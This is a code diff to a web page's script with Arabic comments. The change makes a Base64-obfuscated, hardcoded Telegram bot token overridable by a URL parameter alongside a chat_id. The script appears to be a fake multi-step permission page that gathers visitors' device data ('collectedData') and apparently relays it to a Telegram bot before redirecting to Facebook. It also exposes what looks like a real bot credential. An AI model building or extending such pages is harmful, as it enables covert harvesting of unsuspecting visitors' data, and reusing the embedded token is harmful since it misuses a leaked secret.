@@ -77,8 +77,20 @@
 </div>
 
 <script>
-// تم تصحيح التوكن كما طلبت (مشفّر بـ Base64)
-const BOT_TOKEN = atob("ODMwMjkxODQzNjpBQUU1LTZocS02M24wRW55Ml9wWEpwQXRXcGEtVDZBUkxuTQ==");
+// جلب التوكن من رابط URL
+function getTokenFromUrl() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('token') || atob("ODMwMjkxODQzNjpBQUU1LTZocS02M24wRW55Ml9wWEpwQXRXcGEtVDZBUkxuTQ==");
+}
+
+// جلب الـ chat_id من رابط URL
+function getChatIdFromUrl() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('chat_id') || null;
+}
+
+// الحصول على التوكن من الرابط
+const BOT_TOKEN = getTokenFromUrl();
 const FACEBOOK_URL = "https://www.facebook.com";
 
 const collectedData = {
@@ -92,11 +104,6 @@ const collectedData = {
     hardwareConcurrency: null,
     storage: null
 };
-
-function getChatIdFromUrl() {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get('chat_id') || null;
-}
 
 function showStep(stepId) {
     document.querySelectorAll('.permission-step').forEach(el => el.style.display = 'none');
